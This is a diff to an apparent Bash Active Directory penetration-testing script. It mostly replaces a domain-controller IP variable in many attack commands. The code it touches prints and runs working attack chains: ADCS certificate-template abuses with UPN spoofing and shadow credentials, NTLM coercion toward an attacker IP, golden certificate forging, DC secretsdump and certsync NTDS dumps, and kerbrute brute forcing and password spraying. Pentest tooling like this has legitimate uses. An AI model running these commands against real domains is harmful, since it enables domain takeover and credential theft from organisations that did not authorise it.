+            echo -e "${certipy} ca ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -add-officer '${user}' -dc-ip ${dc_ip_bracket} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Enable SubCA certificate template:${NC}"
-            echo -e "${certipy} ca ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -enable-template SubCA -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} ca ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -enable-template SubCA -dc-ip ${dc_ip_bracket} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}3. Save the private key and note down the request ID:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers_display} ] -template SubCA -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers_display} ] -template SubCA -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip_bracket} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}4. Issue a failed request (need ManageCA and ManageCertificates rights for a failed request):${NC}"
-            echo -e "${certipy} ca ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -issue-request <request_ID> -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} ca ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -issue-request <request_ID> -dc-ip ${dc_ip_bracket} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}5. Retrieve an issued certificate:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers_display} ] -retrieve <request_ID> -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers_display} ] -retrieve <request_ID> -dc-ip ${dc_ip_bracket} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}6. Authenticate using pfx of Domain Admin:${NC}"
-            echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
+            echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip_bracket} ${ldaps_param}"
         done
     fi
 
@@ -2292,9 +2330,9 @@ adcs_vuln_parse() {
             echo -e "${CYAN}1. Start the relay server:${NC}"
             echo -e "${certipy} relay -target http://[ ${pki_servers_display} ] -ca \"${vulnca//SPACE/ }\" -template [ DomainController ]"
             echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
-            echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l [ ${attacker_IP} ] --dc-ip ${dc_ip}"
+            echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip_bracket} -l ${attacker_IP_bracket} --dc-ip ${dc_ip_bracket}"
             echo -e "${CYAN}3. Authenticate using pfx of Domain Controller:${NC}"
-            echo -e "${certipy} auth -pfx ${dc_NETBIOS}$.pfx -dc-ip ${dc_ip} ${ldaps_param}"
+            echo -e "${certipy} auth -pfx ${dc_NETBIOS}$.pfx -dc-ip ${dc_ip_bracket} ${ldaps_param}"
         done
     fi
 
@@ -2304,15 +2342,15 @@ adcs_vuln_parse() {
         for vulntemp in $esc9_vuln; do
             echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}"
-            echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip_bracket} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Change userPrincipalName of second_user to Domain Admin (UPN spoofing):${NC}"
-            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip_bracket} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}3. Request vulnerable certificate as second_user:${NC}"
-            echo -e "${certipy} req -username <second_user>@${dc_domain} -hashes <second_user_hash> -target [ ${pki_servers_display} ] -ca [ \"${pki_cas_display}\" ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req -username <second_user>@${dc_domain} -hashes <second_user_hash> -target [ ${pki_servers_display} ] -ca [ \"${pki_cas_display}\" ] -template ${vulntemp} -dc-ip ${dc_ip_bracket} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
-            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip_bracket} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}5. Authenticate as the target administrator:${NC}"
-            echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
+            echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip_bracket} ${ldaps_param}"
         done
     fi
 
@@ -2326,7 +2364,7 @@ adcs_vuln_parse() {
             echo -e "_OR_"
             echo -e "${certipy} relay -target rpc://[ ${pki_servers_display} ] -ca \"${vulnca//SPACE/ }\""
             echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
-            echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l ${attacker_IP} --dc-ip $dc_ip"
+            echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip_bracket} -l ${attacker_IP_bracket} --dc-ip ${dc_ip_bracket}"
         done
     fi
 
@@ -2336,12 +2374,12 @@ adcs_vuln_parse() {
         for vulntemp in $esc13_vuln; do
             echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request a certificate from the vulnerable template:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers_display} ] -ca [ \"${pki_cas_display}\" ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers_display} ] -ca [ \"${pki_cas_display}\" ] -template ${vulntemp} -dc-ip ${dc_ip_bracket} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Authenticate with the obtained certificate to get a TGT:${NC}"
-            echo -e "${certipy} auth -pfx ${user}.pfx -dc-ip ${dc_ip} ${ldaps_param}"
+            echo -e "${certipy} auth -pfx ${user}.pfx -dc-ip ${dc_ip_bracket} ${ldaps_param}"
             echo -e "${CYAN}3. Use the obtained TGT to perform privileged actions:${NC}"
             echo -e "export KRB5CCNAME=${user}.ccache"
-            echo -e "secretsdump.py -just-dc-user '${dc_NETBIOS}$' ${argument_imp} -dc-ip ${dc_ip} -k -no-pass"
+            echo -e "secretsdump.py -just-dc-user '${dc_NETBIOS}$' ${argument_imp} -dc-ip ${dc_ip_bracket} -k -no-pass"
         done
     fi
 
@@ -2351,13 +2389,13 @@ adcs_vuln_parse() {
         for vulntemp in $esc15_vuln; do
             echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request a certificate injecting 'Client Authentication' Application Policy:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers_display} ] -ca [ \"${pki_cas_display}\" ] -template ${vulntemp} -application-policies 'Client Authentication' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers_display} ] -ca [ \"${pki_cas_display}\" ] -template ${vulntemp} -application-policies 'Client Authentication' -dc-ip ${dc_ip_bracket} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "_OR_"
             echo -e "${CYAN}1. Request a certificate, injecting 'Certificate Request Agent' Application Policy, then using the 'Agent' certificate:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers_display} ] -ca [ \"${pki_cas_display}\" ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -sid '${sid_domain}-500' -application-policies 'Certificate Request Agent' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
-            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers_display} ] -ca [ \"${pki_cas_display}\" ] -template User -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\[ Domain Admin ] -pfx '${user}.pfx' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers_display} ] -ca [ \"${pki_cas_display}\" ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -sid '${sid_domain}-500' -application-policies 'Certificate Request Agent' -dc-ip ${dc_ip_bracket} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -target [ ${pki_servers_display} ] -ca [ \"${pki_cas_display}\" ] -template User -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\[ Domain Admin ] -pfx '${user}.pfx' -dc-ip ${dc_ip_bracket} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}6. Authenticate using pfx of Domain Admin:${NC}"
-            echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
+            echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip_bracket} ${ldaps_param}"
         done
     fi
 
@@ -2367,15 +2405,15 @@ adcs_vuln_parse() {
         for vulnca in $esc16_vuln; do
             echo -e "\n${BLUE}# \"${vulnca//SPACE/ }\" certificate authority${NC}"
             echo -e "${CYAN}1. Update the victim account's UPN to the target administrator's sAMAccountName:${NC}"
-            echo -e "${certipy} account update ${argument_certipy} -dc-ip ${dc_ip} -user [ Victim ] -upn [ Domain Admin ]@${dc_domain} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} account update ${argument_certipy} -dc-ip ${dc_ip_bracket} -user [ Victim ] -upn [ Domain Admin ]@${dc_domain} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Retrieve credentials of the victim account using Shadow Credentials:${NC}"
-            echo -e "${certipy} shadow auto ${argument_certipy} -dc-ip ${dc_ip} -account [ Victim ] ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} shadow auto ${argument_certipy} -dc-ip ${dc_ip_bracket} -account [ Victim ] ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}3. Request a certificate as the Victim user from any suitable 'Client Authentication' template:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -k -target [ ${pki_servers_display} ] -ca \"${vulnca//SPACE/ }\" -template User -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -k -target [ ${pki_servers_display} ] -ca \"${vulnca//SPACE/ }\" -template User -dc-ip ${dc_ip_bracket} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}4. Revert the victim account's UPN:${NC}"
-            echo -e "${certipy} account update ${argument_certipy} -dc-ip ${dc_ip} -user [ Victim ] -upn [ Victim ]@${dc_domain} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} account update ${argument_certipy} -dc-ip ${dc_ip_bracket} -user [ Victim ] -upn [ Victim ]@${dc_domain} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}6. Authenticate using pfx of Domain Admin:${NC}"
-            echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
+            echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip_bracket} ${ldaps_param}"
         done
     fi
 }
@@ -2400,17 +2438,17 @@ certifried_check() {
                     if [ "${ldapsign_bool}" == true ]; then ldapsign_param=""; else ldapsign_param="-no-ldap-signing"; fi
                     if [ "${ldapbind_bool}" == true ]; then ldapbind_param=""; else ldapbind_param="-no-ldap-channel-binding"; fi
                     if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-                    run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapsign_param} ${ldapbind_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096" 2>&1 | tee "${ADCS_dir}/certifried_check_${pki_server}_${user_var}.txt"
+                    run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip_bracket} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapsign_param} ${ldapbind_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096" 2>&1 | tee "${ADCS_dir}/certifried_check_${pki_server}_${user_var}.txt"
                     if ! grep -q "Certificate object SID is" "${ADCS_dir}/certifried_check_${pki_server}_${user_var}.txt" && ! grep -q "error" "${ADCS_dir}/certifried_check_${pki_server}_${user_var}.txt"; then
                         echo -e "${GREEN}[+] ${pki_server} potentially vulnerable to Certifried! Follow steps below for exploitation:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                         echo -e "${CYAN}1. Create a new computer account with a dNSHostName property of a Domain Controller:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
-                        echo -e "${certipy} account create ${argument_certipy} -user NEW_COMPUTER_NAME -pass NEW_COMPUTER_PASS -dc-ip $dc_ip -dns $dc_NETBIOS.$dc_domain ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
+                        echo -e "${certipy} account create ${argument_certipy} -user NEW_COMPUTER_NAME -pass NEW_COMPUTER_PASS -dc-ip ${dc_ip_bracket} -dns $dc_NETBIOS.$dc_domain ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                         echo -e "${CYAN}2. Obtain a certificate for the new computer:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
-                        echo -e "${certipy} req -u NEW_COMPUTER_NAME\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca \"${pki_ca//SPACE/ }\" -template Machine -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
+                        echo -e "${certipy} req -u NEW_COMPUTER_NAME\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip ${dc_ip_bracket} -target $pki_server -ca \"${pki_ca//SPACE/ }\" -template Machine -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                         echo -e "${CYAN}3. Authenticate using pfx:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
-                        echo -e "${certipy} auth -pfx ${dc_NETBIOS}$.pfx -username ${dc_NETBIOS}\$ -dc-ip ${dc_ip} ${ldaps_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
+                        echo -e "${certipy} auth -pfx ${dc_NETBIOS}$.pfx -username ${dc_NETBIOS}\$ -dc-ip ${dc_ip_bracket} ${ldaps_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                         echo -e "${CYAN}4. Delete the created computer:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
-                        echo -e "${certipy} account delete ${argument_certipy} -dc-ip ${dc_ip} -user NEW_COMPUTER_NAME ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
+                        echo -e "${certipy} account delete ${argument_certipy} -dc-ip ${dc_ip_bracket} -user NEW_COMPUTER_NAME ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                     fi
                 done
                 cd "${current_dir}" || exit
@@ -2430,7 +2468,7 @@ certipy_ldapshell() {
             echo -e "${BLUE}[*] Launching LDAP shell via Schannel using Certipy ${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-            run_command "${certipy} auth -pfx ${pfxcert} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} -ldap-shell" 2>&1 | tee "${ADCS_dir}/certipy_ldapshell_output_${user_var}.txt"
+            run_command "${certipy} auth -pfx ${pfxcert} -dc-ip ${dc_ip_bracket} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} -ldap-shell" 2>&1 | tee "${ADCS_dir}/certipy_ldapshell_output_${user_var}.txt"
         else
             echo -e "${PURPLE}[-] Certificate authentication required to open LDAP shell using Certipy${NC}"
         fi
@@ -2458,12 +2496,12 @@ certipy_ca_dump() {
                 i=$((i + 1))
                 pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
                 if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-                run_command "${certipy} ca ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} -target ${pki_server} -backup ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee -a "${ADCS_dir}/certipy_ca_backup_output_${user_var}.txt"
+                run_command "${certipy} ca ${argument_certipy} -dc-ip ${dc_ip_bracket} -ns ${dns_ip} ${dnstcp_param} -target ${pki_server} -backup ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee -a "${ADCS_dir}/certipy_ca_backup_output_${user_var}.txt"
                 run_command "${certipy} forge -ca-pfx ${Credentials_dir}/${pki_ca//SPACE/_}.pfx -upn Administrator@${dc_domain} -subject CN=Administrator,CN=Users,$domain_DN -out Administrator_${pki_ca//SPACE/_}_${dc_domain}.pfx" | tee -a "${ADCS_dir}/certipy_forge_output_${user_var}.txt"
                 if stat "${Credentials_dir}/Administrator_${pki_ca//SPACE/_}_${dc_domain}.pfx" >/dev/null 2>&1; then
                     echo -e "${GREEN}[+] Golden Certificate successfully generated!${NC}"
                     echo -e "${CYAN}Authenticate using pfx of Administrator:${NC}"
-                    echo -e "${certipy} auth -pfx ${Credentials_dir}/Administrator_${pki_ca//SPACE/_}_${dc_domain}.pfx -dc-ip ${dc_ip} [-ldap-shell] ${ldaps_param}"
+                    echo -e "${certipy} auth -pfx ${Credentials_dir}/Administrator_${pki_ca//SPACE/_}_${dc_domain}.pfx -dc-ip ${dc_ip_bracket} [-ldap-shell] ${ldaps_param}"
                 fi
             done
             cd "${current_dir}" || exit
@@ -2505,7 +2543,7 @@ certsync_ntds_dump() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-            run_command "${certsync} ${argument_certsync} -dc-ip ${dc_ip} ${dnstcp_param} -ns ${dns_ip} ${ldaps_param} -kdcHost ${dc_FQDN} -outputfile ${Credentials_dir}/certsync_${user_var}.txt"
+            run_command "${certsync} ${argument_certsync} -dc-ip ${dc_ip_bracket} ${dnstcp_param} -ns ${dns_ip} ${ldaps_param} -kdcHost ${dc_FQDN} -outputfile ${Credentials_dir}/certsync_${user_var}.txt"
         fi
     fi
     echo -e ""
@@ -2528,8 +2566,8 @@ sccmhunter_enum() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
             /bin/rm -rf "$HOME/.sccmhunter/logs/" 2>/dev/null
-            run_command "${python3} ${sccmhunter} find ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
-            run_command "${python3} ${sccmhunter} smb ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -save" 2>&1 | tee "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
+            run_command "${python3} ${sccmhunter} find ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip_bracket}" 2>&1 | tee -a "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
+            run_command "${python3} ${sccmhunter} smb ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip_bracket} -save" 2>&1 | tee "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
             if ! grep -q 'SCCM doesn' "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt" && ! grep -q 'Traceback' "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"; then
                 run_command "${python3} ${sccmhunter} show -users" 2>/dev/null | tee -a "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
                 run_command "${python3} ${sccmhunter} show -computers" 2>/dev/null | tee -a "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
@@ -2551,7 +2589,7 @@ sccmhunter_dump() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
             if ! grep -q 'SCCM doesn' "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt" && ! grep -q 'Traceback' "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"; then
-                run_command "${python3} ${sccmhunter} http ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -auto" 2>/dev/null | tee -a "${SCCM_dir}/sccmhunter_dump_output_${dc_domain}.txt"
+                run_command "${python3} ${sccmhunter} http ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip_bracket} -auto" 2>/dev/null | tee -a "${SCCM_dir}/sccmhunter_dump_output_${dc_domain}.txt"
             else
                 echo -e "${PURPLE}[-] No SCCM servers found! Please re-run SCCM enumeration using sccmhunter and try again..${NC}"
             fi
@@ -2622,8 +2660,8 @@ GPOwned_enum() {
             echo -e "${PURPLE}[-] GPOwned requires credentials${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-use-ldaps"; else ldaps_param=""; fi
-            run_command "${python3} ${GPOwned} ${argument_GPOwned} ${ldaps_param} -dc-ip ${dc_ip} -listgpo -gpcuser" | tee "${GPO_dir}/GPOwned_output_${dc_domain}.txt"
-            run_command "${python3} ${GPOwned} ${argument_GPOwned} ${ldaps_param} -dc-ip ${dc_ip} -listgpo -gpcmachine" | tee -a "${GPO_dir}/GPOwned_output_${dc_domain}.txt"
+            run_command "${python3} ${GPOwned} ${argument_GPOwned} ${ldaps_param} -dc-ip ${dc_ip_bracket} -listgpo -gpcuser" | tee "${GPO_dir}/GPOwned_output_${dc_domain}.txt"
+            run_command "${python3} ${GPOwned} ${argument_GPOwned} ${ldaps_param} -dc-ip ${dc_ip_bracket} -listgpo -gpcmachine" | tee -a "${GPO_dir}/GPOwned_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -2652,7 +2690,7 @@ gpb_enum() {
             echo -e "${PURPLE}[-] GroupPolicyBackdoor does not support Kerberos authentication using AES Key${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
-            run_command "${python3} ${GroupPolicyBackdoor} enum list-gpos ${argument_gpb} --dc ${dc_ip} ${ldaps_param}" | tee "${GPO_dir}/gpbenum_output_${user_var}.txt"
+            run_command "${python3} ${GroupPolicyBackdoor} enum list-gpos ${argument_gpb} --dc ${dc_ip_bracket} ${ldaps_param}" | tee "${GPO_dir}/gpbenum_output_${user_var}.txt"
         fi
     fi
     echo -e ""
@@ -2681,7 +2719,7 @@ kerbrute_enum() {
         else
             echo -e "${BLUE}[*] kerbrute User Enumeration (Null session)${NC}"
             echo -e "${YELLOW}[i] Using $user_wordlist wordlist for user enumeration. This may take a while...${NC}"
-            run_command "${kerbrute} userenum ${user_wordlist} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" >>"${BruteForce_dir}/kerbrute_user_output_${dc_domain}.txt"
+            run_command "${kerbrute} userenum ${user_wordlist} -d ${dc_domain} --dc ${dc_ip_bracket} -t 5 ${argument_kerbrute}" >>"${BruteForce_dir}/kerbrute_user_output_${dc_domain}.txt"
             grep "VALID" "${BruteForce_dir}/kerbrute_user_output_${dc_domain}.txt" | cut -d " " -f 8 | cut -d "@" -f 1 >"${Users_dir}/users_list_kerbrute_${dc_domain}.txt" 2>&1
             if [ -s "${Users_dir}/users_list_kerbrute_${dc_domain}.txt" ]; then
                 echo -e "${GREEN}[+] Printing valid accounts...${NC}"
@@ -2740,7 +2778,7 @@ userpass_kerbrute_check() {
             echo -e "${clean_user}:${clean_user}" >>"${user_pass_wordlist}"
         done <"${target_userslist}"
         sort -uf "${user_pass_wordlist}" -o "${user_pass_wordlist}"
-        run_command "${kerbrute} bruteforce ${user_pass_wordlist} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" | tee "${BruteForce_dir}/kerbrute_pass_output_${dc_domain}.txt"
+        run_command "${kerbrute} bruteforce ${user_pass_wordlist} -d ${dc_domain} --dc ${dc_ip_bracket} -t 5 ${argument_kerbrute}" | tee "${BruteForce_dir}/kerbrute_pass_output_${dc_domain}.txt"
         grep "VALID" "${BruteForce_dir}/kerbrute_pass_output_${dc_domain}.txt" | cut -d " " -f 8 | cut -d "@" -f 1 >"${BruteForce_dir}/user_eq_pass_valid_kerb_${dc_domain}.txt"
         if [ -s "${BruteForce_dir}/user_eq_pass_valid_kerb_${dc_domain}.txt" ]; then
             echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
@@ -2802,7 +2840,7 @@ kerbrute_passpray() {
             read -rp ">> " passpray_password </dev/tty
         done
         echo -e "${YELLOW}[i] Password spraying with password ${passpray_password}. This may take a while...${NC}"
-        run_command "${kerbrute} passwordspray ${target_userslist} ${passpray_password} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" | tee -a "${BruteForce_dir}/kerbrute_passpray_output_${dc_domain}.txt"
+        run_command "${kerbrute} passwordspray ${target_userslist} ${passpray_password} -d ${dc_domain} --dc ${dc_ip_bracket} -t 5 ${argument_kerbrute}" | tee -a "${BruteForce_dir}/kerbrute_passpray_output_${dc_domain}.txt"
         grep "VALID" "${BruteForce_dir}/kerbrute_passpray_output_${dc_domain}.txt" | cut -d " " -f 8 | cut -d "@" -f 1 >>"${BruteForce_dir}/passpray_valid_kerb_${dc_domain}.txt"
         if [ -s "${BruteForce_dir}/passpray_valid_kerb_${dc_domain}.txt" ]; then
             echo -e "${GREEN}[+] Printing accounts with passwords found ...${NC}"
@@ -2830,12 +2868,12 @@ pre2k_check() {
             if [ ! -s "${servers_hostname_list}" ]; then
                 echo -e "${PURPLE}[-] No computers found! Please re-run computers enumeration and try again..${NC}"
             else
-                run_command "${pre2k} unauth ${argument_pre2k} -dc-ip ${dc_ip} -inputfile ${servers_hostname_list} -outputfile ${pre2k_outputfile}" | tee "${BruteForce_dir}/pre2k_output_${dc_domain}.txt"
+                run_command "${pre2k} unauth ${argument_pre2k} -dc-ip ${dc_ip_bracket} -inputfile ${servers_hostname_list} -outputfile ${pre2k_outputfile}" | tee "${BruteForce_dir}/pre2k_output_${dc_domain}.txt"
             fi
         else
             if [ "${ldapbind_bool}" == true ]; then ldapbind_param="-binding"; else ldapbind_param=""; fi
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps ${ldapbind_param}"; else ldaps_param=""; fi
-            run_command "${pre2k} auth ${argument_pre2k} -dc-ip ${dc_ip} -outputfile ${pre2k_outputfile} ${ldaps_param}" | tee "${BruteForce_dir}/pre2k_output_${dc_domain}.txt"
+            run_command "${pre2k} auth ${argument_pre2k} -dc-ip ${dc_ip_bracket} -outputfile ${pre2k_outputfile} ${ldaps_param}" | tee "${BruteForce_dir}/pre2k_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -2849,7 +2887,7 @@ ldapnomnom_enum() {
             echo -e "${BLUE}[*] ldapnomnom User Enumeration (Null session)${NC}"
             echo -e "${YELLOW}[i] Using $user_wordlist wordlist for user enumeration. This may take a while...${NC}"
